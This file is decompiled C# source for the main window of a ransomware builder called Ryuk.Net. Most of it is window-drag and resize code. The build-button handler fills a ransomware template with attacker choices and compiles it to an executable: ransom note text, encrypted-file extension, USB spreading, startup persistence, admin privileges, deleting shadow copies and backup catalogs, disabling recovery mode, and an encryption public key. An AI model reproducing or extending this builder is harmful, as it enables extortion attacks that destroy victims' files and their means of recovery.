using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Ryuk.Net;
using Ryuk.Net.Properties;

namespace CustomWindowsForm
{
	// Token: 0x02000003 RID: 3
	public partial class BlackForm : Form
	{
		// Token: 0x0600001D RID: 29 RVA: 0x00003A70 File Offset: 0x00001C70
		public BlackForm()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00003AF0 File Offset: 0x00001CF0
		private void BlackForm_Load(object sender, EventArgs e)
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.MainModule.FileName.Contains(folderPath))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00003B6C File Offset: 0x00001D6C
		private void TopBorderPanel_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				this.isTopBorderPanelDragged = true;
			}
			else
			{
				this.isTopBorderPanelDragged = false;
			}
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00003BA4 File Offset: 0x00001DA4
		private void TopBorderPanel_MouseMove(object sender, MouseEventArgs e)
		{
			if (e.Y < base.Location.Y)
			{
				if (this.isTopBorderPanelDragged)
				{
					if (base.Height < 50)
					{
						base.Height = 50;
						this.isTopBorderPanelDragged = false;
					}
					else
					{
						base.Location = new Point(base.Location.X, base.Location.Y + e.Y);
						base.Height -= e.Y;
					}
				}
			}
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00003C4A File Offset: 0x00001E4A
		private void TopBorderPanel_MouseUp(object sender, MouseEventArgs e)
		{
			this.isTopBorderPanelDragged = false;
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00003C54 File Offset: 0x00001E54
		private void TopPanel_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				this.isTopPanelDragged = true;
				Point point = base.PointToScreen(new Point(e.X, e.Y));
				this.offset = default(Point);
				this.offset.X = base.Location.X - point.X;
				this.offset.Y = base.Location.Y - point.Y;
			}
			else
			{
				this.isTopPanelDragged = false;
			}
			if (e.Clicks == 2)
			{
				this.isTopPanelDragged = false;
				this._MaxButton_Click(sender, e);
			}
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00003D14 File Offset: 0x00001F14
		private void TopPanel_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.isTopPanelDragged)
			{
				Point location = this.TopPanel.PointToScreen(new Point(e.X, e.Y));
				location.Offset(this.offset);
				base.Location = location;
				if (base.Location.X > 2 || base.Location.Y > 2)
				{
					if (base.WindowState == FormWindowState.Maximized)
					{
						base.Location = this._normalWindowLocation;
						base.Size = this._normalWindowSize;
						this._MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
						this.isWindowMaximized = false;
					}
				}
			}
		}

		// Token: 0x06000024 RID: 36 RVA: 0x00003DD8 File Offset: 0x00001FD8
		private void TopPanel_MouseUp(object sender, MouseEventArgs e)
		{
			this.isTopPanelDragged = false;
			if (base.Location.Y <= 5)
			{
				if (!this.isWindowMaximized)
				{
					this._normalWindowSize = base.Size;
					this._normalWindowLocation = base.Location;
					Rectangle workingArea = Screen.PrimaryScreen.WorkingArea;
					base.Location = new Point(0, 0);
					base.Size = new Size(workingArea.Width, workingArea.Height);
					this._MaxButton.CFormState = MinMaxButton.CustomFormState.Maximize;
					this.isWindowMaximized = true;
				}
			}
		}

		// Token: 0x06000025 RID: 37 RVA: 0x00003E70 File Offset: 0x00002070
		private void LeftPanel_MouseDown(object sender, MouseEventArgs e)
		{
			if (base.Location.X <= 0 || e.X < 0)
			{
				this.isLeftPanelDragged = false;
				base.Location = new Point(10, base.Location.Y);
			}
			else if (e.Button == MouseButtons.Left)
			{
				this.isLeftPanelDragged = true;
			}
			else
			{
				this.isLeftPanelDragged = false;
			}
		}

		// Token: 0x06000026 RID: 38 RVA: 0x00003EF4 File Offset: 0x000020F4
		private void LeftPanel_MouseMove(object sender, MouseEventArgs e)
		{
			if (e.X < base.Location.X)
			{
				if (this.isLeftPanelDragged)
				{
					if (base.Width < 100)
					{
						base.Width = 100;
						this.isLeftPanelDragged = false;
					}
					else
					{
						base.Location = new Point(base.Location.X + e.X, base.Location.Y);
						base.Width -= e.X;
					}
				}
			}
		}

		// Token: 0x06000027 RID: 39 RVA: 0x00003F9A File Offset: 0x0000219A
		private void LeftPanel_MouseUp(object sender, MouseEventArgs e)
		{
			this.isLeftPanelDragged = false;
		}

		// Token: 0x06000028 RID: 40 RVA: 0x00003FA4 File Offset: 0x000021A4
		private void RightPanel_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				this.isRightPanelDragged = true;
			}
			else
			{
				this.isRightPanelDragged = false;
			}
		}

		// Token: 0x06000029 RID: 41 RVA: 0x00003FDC File Offset: 0x000021DC
		private void RightPanel_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.isRightPanelDragged)
			{
				if (base.Width < 100)
				{
					base.Width = 100;
					this.isRightPanelDragged = false;
				}
				else
				{
					base.Width += e.X;
				}
			}
		}

		// Token: 0x0600002A RID: 42 RVA: 0x00004034 File Offset: 0x00002234
		private void RightPanel_MouseUp(object sender, MouseEventArgs e)
		{
			this.isRightPanelDragged = false;
		}

		// Token: 0x0600002B RID: 43 RVA: 0x00004040 File Offset: 0x00002240
		private void BottomPanel_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				this.isBottomPanelDragged = true;
			}
			else
			{
				this.isBottomPanelDragged = false;
			}
		}

		// Token: 0x0600002C RID: 44 RVA: 0x00004078 File Offset: 0x00002278
		private void BottomPanel_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.isBottomPanelDragged)
			{
				if (base.Height < 50)
				{
					base.Height = 50;
					this.isBottomPanelDragged = false;
				}
				else
				{
					base.Height += e.Y;
				}
			}
		}

		// Token: 0x0600002D RID: 45 RVA: 0x000040D0 File Offset: 0x000022D0
		private void BottomPanel_MouseUp(object sender, MouseEventArgs e)
		{
			this.isBottomPanelDragged = false;
		}

		// Token: 0x0600002E RID: 46 RVA: 0x000040DA File Offset: 0x000022DA
		private void _MinButton_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		// Token: 0x0600002F RID: 47 RVA: 0x000040E8 File Offset: 0x000022E8
		private void _MaxButton_Click(object sender, EventArgs e)
		{
			if (this.isWindowMaximized)
			{
				base.Location = this._normalWindowLocation;
				base.Size = this._normalWindowSize;
				this._MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
				this.isWindowMaximized = false;
			}
			else
			{
				this._normalWindowSize = base.Size;
				this._normalWindowLocation = base.Location;
				Rectangle workingArea = Screen.PrimaryScreen.WorkingArea;
				base.Location = new Point(0, 0);
				base.Size = new Size(workingArea.Width, workingArea.Height);
				this._MaxButton.CFormState = MinMaxButton.CustomFormState.Maximize;
				this.isWindowMaximized = true;
			}
		}

		// Token: 0x06000030 RID: 48 RVA: 0x00004196 File Offset: 0x00002396
		private void _CloseButton_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x06000031 RID: 49 RVA: 0x000041A0 File Offset: 0x000023A0
		private void RightBottomPanel_1_MouseDown(object sender, MouseEventArgs e)
		{
			this.isRightBottomPanelDragged = true;
		}

		// Token: 0x06000032 RID: 50 RVA: 0x000041AC File Offset: 0x000023AC
		private void RightBottomPanel_1_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.isRightBottomPanelDragged)
			{
				if (base.Width < 100 || base.Height < 50)
				{
					base.Width = 100;
					base.Height = 50;
					this.isRightBottomPanelDragged = false;
				}
				else
				{
					base.Width += e.X;
					base.Height += e.Y;
				}
			}
		}

		// Token: 0x06000033 RID: 51 RVA: 0x0000422F File Offset: 0x0000242F
		private void RightBottomPanel_1_MouseUp(object sender, MouseEventArgs e)
		{
			this.isRightBottomPanelDragged = false;
		}

		// Token: 0x06000034 RID: 52 RVA: 0x00004239 File Offset: 0x00002439
		private void RightBottomPanel_2_MouseDown(object sender, MouseEventArgs e)
		{
			this.RightBottomPanel_1_MouseDown(sender, e);
		}

		// Token: 0x06000035 RID: 53 RVA: 0x00004245 File Offset: 0x00002445
		private void RightBottomPanel_2_MouseMove(object sender, MouseEventArgs e)
		{
			this.RightBottomPanel_1_MouseMove(sender, e);
		}

		// Token: 0x06000036 RID: 54 RVA: 0x00004251 File Offset: 0x00002451
		private void RightBottomPanel_2_MouseUp(object sender, MouseEventArgs e)
		{
			this.RightBottomPanel_1_MouseUp(sender, e);
		}

		// Token: 0x06000037 RID: 55 RVA: 0x0000425D File Offset: 0x0000245D
		private void LeftBottomPanel_1_MouseDown(object sender, MouseEventArgs e)
		{
			this.isLeftBottomPanelDragged = true;
		}

		// Token: 0x06000038 RID: 56 RVA: 0x00004268 File Offset: 0x00002468
		private void LeftBottomPanel_1_MouseMove(object sender, MouseEventArgs e)
		{
			if (e.X < base.Location.X)
			{
				if (this.isLeftBottomPanelDragged || base.Height < 50)
				{
					if (base.Width < 100)
					{
						base.Width = 100;
						base.Height = 50;
						this.isLeftBottomPanelDragged = false;
					}
					else
					{
						base.Location = new Point(base.Location.X + e.X, base.Location.Y);
						base.Width -= e.X;
						base.Height += e.Y;
					}
				}
			}
		}

		// Token: 0x06000039 RID: 57 RVA: 0x00004341 File Offset: 0x00002541
		private void LeftBottomPanel_1_MouseUp(object sender, MouseEventArgs e)
		{
			this.isLeftBottomPanelDragged = false;
		}

		// Token: 0x0600003A RID: 58 RVA: 0x0000434B File Offset: 0x0000254B
		private void LeftBottomPanel_2_MouseDown(object sender, MouseEventArgs e)
		{
			this.LeftBottomPanel_1_MouseDown(sender, e);
		}

		// Token: 0x0600003B RID: 59 RVA: 0x00004357 File Offset: 0x00002557
		private void LeftBottomPanel_2_MouseMove(object sender, MouseEventArgs e)
		{
			this.LeftBottomPanel_1_MouseMove(sender, e);
		}

		// Token: 0x0600003C RID: 60 RVA: 0x00004363 File Offset: 0x00002563
		private void LeftBottomPanel_2_MouseUp(object sender, MouseEventArgs e)
		{
			this.LeftBottomPanel_1_MouseUp(sender, e);
		}

		// Token: 0x0600003D RID: 61 RVA: 0x0000436F File Offset: 0x0000256F
		private void RightTopPanel_1_MouseDown(object sender, MouseEventArgs e)
		{
			this.isRightTopPanelDragged = true;
		}

		// Token: 0x0600003E RID: 62 RVA: 0x0000437C File Offset: 0x0000257C
		private void RightTopPanel_1_MouseMove(object sender, MouseEventArgs e)
		{
			if (e.Y < base.Location.Y || e.X < base.Location.X)
			{
				if (this.isRightTopPanelDragged)
				{
					if (base.Height < 50 || base.Width < 100)
					{
						base.Height = 50;
						base.Width = 100;
						this.isRightTopPanelDragged = false;
					}
					else
					{
						base.Location = new Point(base.Location.X, base.Location.Y + e.Y);
						base.Height -= e.Y;
						base.Width += e.X;
					}
				}
			}
		}

		// Token: 0x0600003F RID: 63 RVA: 0x0000446D File Offset: 0x0000266D
		private void RightTopPanel_1_MouseUp(object sender, MouseEventArgs e)
		{
			this.isRightTopPanelDragged = false;
		}

		// Token: 0x06000040 RID: 64 RVA: 0x00004477 File Offset: 0x00002677
		private void RightTopPanel_2_MouseDown(object sender, MouseEventArgs e)
		{
			this.RightTopPanel_1_MouseDown(sender, e);
		}

		// Token: 0x06000041 RID: 65 RVA: 0x00004483 File Offset: 0x00002683
		private void RightTopPanel_2_MouseMove(object sender, MouseEventArgs e)
		{
			this.RightTopPanel_1_MouseMove(sender, e);
		}

		// Token: 0x06000042 RID: 66 RVA: 0x0000448F File Offset: 0x0000268F
		private void RightTopPanel_2_MouseUp(object sender, MouseEventArgs e)
		{
			this.RightTopPanel_1_MouseUp(sender, e);
		}

		// Token: 0x06000043 RID: 67 RVA: 0x0000449B File Offset: 0x0000269B
		private void LeftTopPanel_1_MouseDown(object sender, MouseEventArgs e)
		{
			this.isLeftTopPanelDragged = true;
		}

		// Token: 0x06000044 RID: 68 RVA: 0x000044A8 File Offset: 0x000026A8
		private void LeftTopPanel_1_MouseMove(object sender, MouseEventArgs e)
		{
			if (e.X < base.Location.X || e.Y < base.Location.Y)
			{
				if (this.isLeftTopPanelDragged)
				{
					if (base.Width < 100 || base.Height < 50)
					{
						base.Width = 100;
						base.Height = 100;
						this.isLeftTopPanelDragged = false;
					}
					else
					{
						base.Location = new Point(base.Location.X + e.X, base.Location.Y);
						base.Width -= e.X;
						base.Location = new Point(base.Location.X, base.Location.Y + e.Y);
						base.Height -= e.Y;
					}
				}
			}
		}

		// Token: 0x06000045 RID: 69 RVA: 0x000045CB File Offset: 0x000027CB
		private void LeftTopPanel_1_MouseUp(object sender, MouseEventArgs e)
		{
			this.isLeftTopPanelDragged = false;
		}

		// Token: 0x06000046 RID: 70 RVA: 0x000045D5 File Offset: 0x000027D5
		private void LeftTopPanel_2_MouseDown(object sender, MouseEventArgs e)
		{
			this.LeftTopPanel_1_MouseDown(sender, e);
		}

		// Token: 0x06000047 RID: 71 RVA: 0x000045E1 File Offset: 0x000027E1
		private void LeftTopPanel_2_MouseMove(object sender, MouseEventArgs e)
		{
			this.LeftTopPanel_1_MouseMove(sender, e);
		}

		// Token: 0x06000048 RID: 72 RVA: 0x000045ED File Offset: 0x000027ED
		private void LeftTopPanel_2_MouseUp(object sender, MouseEventArgs e)
		{
			this.LeftTopPanel_1_MouseUp(sender, e);
		}

		// Token: 0x06000049 RID: 73 RVA: 0x000045F9 File Offset: 0x000027F9
		private void file_button_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004A RID: 74 RVA: 0x000045FC File Offset: 0x000027FC
		private void edit_button_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004B RID: 75 RVA: 0x000045FF File Offset: 0x000027FF
		private void view_button_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004C RID: 76 RVA: 0x00004602 File Offset: 0x00002802
		private void run_button_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004D RID: 77 RVA: 0x00004605 File Offset: 0x00002805
		private void help_button_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004E RID: 78 RVA: 0x00004608 File Offset: 0x00002808
		private void WindowTextLabel_MouseDown(object sender, MouseEventArgs e)
		{
			this.TopPanel_MouseDown(sender, e);
		}

		// Token: 0x0600004F RID: 79 RVA: 0x00004614 File Offset: 0x00002814
		private void WindowTextLabel_MouseMove(object sender, MouseEventArgs e)
		{
			this.TopPanel_MouseMove(sender, e);
		}

		// Token: 0x06000050 RID: 80 RVA: 0x00004620 File Offset: 0x00002820
		private void WindowTextLabel_MouseUp(object sender, MouseEventArgs e)
		{
			this.TopPanel_MouseUp(sender, e);
		}

		// Token: 0x06000051 RID: 81 RVA: 0x0000462C File Offset: 0x0000282C
		private void shapedButton3_Click(object sender, EventArgs e)
		{
			Form2 form = new Form2();
			form.ShowDialog();
		}

		// Token: 0x06000052 RID: 82 RVA: 0x00004648 File Offset: 0x00002848
		private void shapedButton4_Click(object sender, EventArgs e)
		{
			if (this.textBox1.Text.Trim().Length < 1)
			{
				MessageBox.Show("Please type your message!", "Read_it.txt", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			else if (string.IsNullOrWhiteSpace("aa"))
			{
				MessageBox.Show("All fields are required", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			else
			{
				StringBuilder stringBuilder = new StringBuilder();
				for (int i = 0; i < this.textBox1.Lines.Length; i++)
				{
					stringBuilder.Append("\"" + this.textBox1.Lines[i] + "\",\n");
				}
				string text = Resources.Source;
				text = text.Replace("#messages", stringBuilder.ToString());
				if (this.checkBox1.Checked)
				{
					text = text.Replace("#encryptedFileExtension", "");
				}
				else
				{
					string text2 = this.textBox2.Text;
					if (text2.Contains("."))
					{
						text2 = text2.Replace(".", "");
					}
					text = text.Replace("#encryptedFileExtension", text2);
				}
				if (this.checkBox2.Checked)
				{
					if (this.textBox4.Text.Trim().Length < 1)
					{
						MessageBox.Show("Proccess name field is empty");
						return;
					}
					if (this.textBox4.Text.EndsWith(".exe"))
					{
						text = text.Replace("#copyRoaming", "true");
						text = text.Replace("#exeName", this.textBox4.Text);
					}
					else
					{
						text = text.Replace("#copyRoaming", "true");
						text = text.Replace("#exeName", this.textBox4.Text + ".exe");
					}
				}
				else
				{
					text = text.Replace("#copyRoaming", "false");
					text = text.Replace("#exeName", this.textBox4.Text);
				}
				if (this.usbSpreadCheckBox.Checked)
				{
					if (this.spreadNameText.Text.Trim().Length < 1)
					{
						MessageBox.Show("Usb spread name field is empty");
						return;
					}
					if (this.spreadNameText.Text.EndsWith(".exe"))
					{
						text = text.Replace("#checkSpread", "true");
						text = text.Replace("#spreadName", this.spreadNameText.Text);
					}
					else
					{
						text = text.Replace("#checkSpread", "true");
						text = text.Replace("#spreadName", this.spreadNameText.Text + ".exe");
					}
				}
				else
				{
					text = text.Replace("#checkSpread", "false");
					text = text.Replace("#spreadName", this.spreadNameText.Text);
				}
				if (this.startupcheckBox3.Checked)
				{
					text = text.Replace("#startupFolder", "true");
				}
				else
				{
					text = text.Replace("#startupFolder", "true");
				}
				if (this.sleepCheckBox.Checked)
				{
					text = text.Replace("#checkSleep", "true");
					text = text.Replace("#sleepTextbox", this.SleepTextBox.Text);
				}
				else
				{
					text = text.Replace("#checkSleep", "false");
					text = text.Replace("#sleepTextbox", this.SleepTextBox.Text);
				}
				if (Settings.Default.checkAdminPrivilage)
				{
					text = text.Replace("#adminPrivilage", "true");
				}
				else
				{
					text = text.Replace("#adminPrivilage", "false");
				}
				if (Settings.Default.deleteBackupCatalog)
				{
					text = text.Replace("#checkdeleteBackupCatalog", "true");
				}
				else
				{
					text = text.Replace("#checkdeleteBackupCatalog", "false");
				}
				if (Settings.Default.deleteShadowCopies)
				{
					text = text.Replace("#checkdeleteShadowCopies", "true");
				}
				else
				{
					text = text.Replace("#checkdeleteShadowCopies", "false");
				}
				if (Settings.Default.disableRecoveryMode)
				{
					text = text.Replace("#checkdisableRecoveryMode", "true");
				}
				else
				{
					text = text.Replace("#checkdisableRecoveryMode", "false");
				}
				if (this.droppedMessageTextbox.Text.Trim().Length < 1)
				{
					MessageBox.Show("Dropped message name field is empty");
				}
				else
				{
					text = text.Replace("#droppedMessageTextbox", this.droppedMessageTextbox.Text);
					string publicKey = Settings.Default.publicKey;
					bool encryptOption = Settings.Default.encryptOption;
					if (encryptOption)
					{
						if (!(publicKey != ""))
						{
							MessageBox.Show("Decrypter name field is empty. Go to advanced option and create or select decrypter", "Advanced Option");
							return;
						}
						using (StringReader stringReader = new StringReader(publicKey))
						{
							StringBuilder stringBuilder2 = new StringBuilder();
							string text3;
							while ((text3 = stringReader.ReadLine()) != null)
							{
								string str = text3.Replace("\"", "\\\"");
								stringBuilder2.AppendLine("pubclicKey.AppendLine(\"" + str + "\");");
							}
							text = text.Replace("#encryptOption", "true");
							text = text.Replace("#publicKey", stringBuilder2.ToString());
						}
					}
					else
					{
						text = text.Replace("#encryptOption", "false");
						text = text.Replace("#publicKey", "");
					}
					if (Settings.Default.base64Image != "")
					{
						text = text.Replace("#base64Image", Settings.Default.base64Image);
					}
					if (Settings.Default.extensions != "")
					{
						text = text.Replace("#extensions", Settings.Default.extensions);
					}
					using (SaveFileDialog saveFileDialog = new SaveFileDialog())
					{
						saveFileDialog.Filter = "Executable (*.exe)|*.exe";
						if (saveFileDialog.ShowDialog() == DialogResult.OK)
						{
							new Compiler(text, saveFileDialog.FileName, this.iconLocation);
						}
					}
				}
			}
		}

		// Token: 0x06000053 RID: 83 RVA: 0x00004D40 File Offset: 0x00002F40
		private void saveFileDialog1_FileOk(object sender, CancelEventArgs e)
		{
		}

		// Token: 0x06000054 RID: 84 RVA: 0x00004D43 File Offset: 0x00002F43
		private void panel2_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000055 RID: 85 RVA: 0x00004D48 File Offset: 0x00002F48
		private void checkBox1_CheckedChanged(object sender, EventArgs e)
		{
			if (!this.textBox2.Enabled)
			{
				this.textBox2.Enabled = true;
			}
			else
			{
				this.textBox2.Enabled = false;
			}
		}

		// Token: 0x06000056 RID: 86 RVA: 0x00004D88 File Offset: 0x00002F88
		private void usbSpreadCheckBox_CheckedChanged(object sender, EventArgs e)
		{
			if (!this.spreadNameText.Enabled)
			{
				this.spreadNameText.Enabled = true;
			}
			else
			{
				this.spreadNameText.Enabled = false;
			}
		}

		// Token: 0x06000057 RID: 87 RVA: 0x00004DC8 File Offset: 0x00002FC8
		private void checkBox2_CheckedChanged(object sender, EventArgs e)
		{
			if (!this.textBox4.Enabled)
			{
				this.textBox4.Enabled = true;
			}
			else
			{
				this.textBox4.Enabled = false;
			}
		}

		// Token: 0x06000058 RID: 88 RVA: 0x00004E05 File Offset: 0x00003005
		private void button1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00004E08 File Offset: 0x00003008
		private void pictureBox1_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "Icons (*.ico)|*.ico";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					this.iconLocation = openFileDialog.FileName;
					this.pictureBox1.Image = Bitmap.FromHicon(new Icon(openFileDialog.FileName, new Size(60, 60)).Handle);
					this.selectIconLabel.Text = "";
				}
			}
		}

		// Token: 0x0600005A RID: 90 RVA: 0x00004EA8 File Offset: 0x000030A8
		private void selectIconLabel_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "Icons (*.ico)|*.ico";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					this.iconLocation = openFileDialog.FileName;
					this.pictureBox1.Image = Bitmap.FromHicon(new Icon(openFileDialog.FileName, new Size(60, 60)).Handle);
					this.selectIconLabel.Text = "";
				}
			}
		}

		// Token: 0x0600005B RID: 91 RVA: 0x00004F48 File Offset: 0x00003148
		private void checkBox3_CheckedChanged(object sender, EventArgs e)
		{
			if (!this.SleepTextBox.Enabled)
			{
				this.SleepTextBox.Enabled = true;
			}
			else
			{
				this.SleepTextBox.Enabled = false;
			}
		}

		// Token: 0x0600005C RID: 92 RVA: 0x00004F88 File Offset: 0x00003188
		private void SleepTextBox_KeyPress_1(object sender, KeyPressEventArgs e)
		{
			if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar))
			{
				e.Handled = true;
			}
		}

		// Token: 0x0600005D RID: 93 RVA: 0x00004FC0 File Offset: 0x000031C0
		private void shapedButton1_Click(object sender, EventArgs e)
		{
			advancedSettingForm advancedSettingForm = new advancedSettingForm();
			advancedSettingForm.ShowDialog();
		}

		// Token: 0x0600005E RID: 94 RVA: 0x00004FDB File Offset: 0x000031DB
		private void textBox1_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600005F RID: 95 RVA: 0x00004FDE File Offset: 0x000031DE
		private void textBox1_MouseClick(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x06000060 RID: 96 RVA: 0x00004FE1 File Offset: 0x000031E1
		private void TopPanel_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000061 RID: 97 RVA: 0x00004FE4 File Offset: 0x000031E4
		private void shapedButton2_Click(object sender, EventArgs e)
		{
			extensions extensions = new extensions();
			extensions.ShowDialog();
		}

		// Token: 0x04000016 RID: 22
		private bool isTopPanelDragged = false;

		// Token: 0x04000017 RID: 23
		private bool isLeftPanelDragged = false;

		// Token: 0x04000018 RID: 24
		private bool isRightPanelDragged = false;

		// Token: 0x04000019 RID: 25
		private bool isBottomPanelDragged = false;

		// Token: 0x0400001A RID: 26
		private bool isTopBorderPanelDragged = false;

		// Token: 0x0400001B RID: 27
		private bool isRightBottomPanelDragged = false;

		// Token: 0x0400001C RID: 28
		private bool isLeftBottomPanelDragged = false;

		// Token: 0x0400001D RID: 29
		private bool isRightTopPanelDragged = false;

		// Token: 0x0400001E RID: 30
		private bool isLeftTopPanelDragged = false;

		// Token: 0x0400001F RID: 31
		private bool isWindowMaximized = false;

		// Token: 0x04000020 RID: 32
		private Point offset;

		// Token: 0x04000021 RID: 33
		private Size _normalWindowSize;

		// Token: 0x04000022 RID: 34
		private Point _normalWindowLocation = Point.Empty;

		// Token: 0x04000023 RID: 35
		private string iconLocation = "";
	}
}
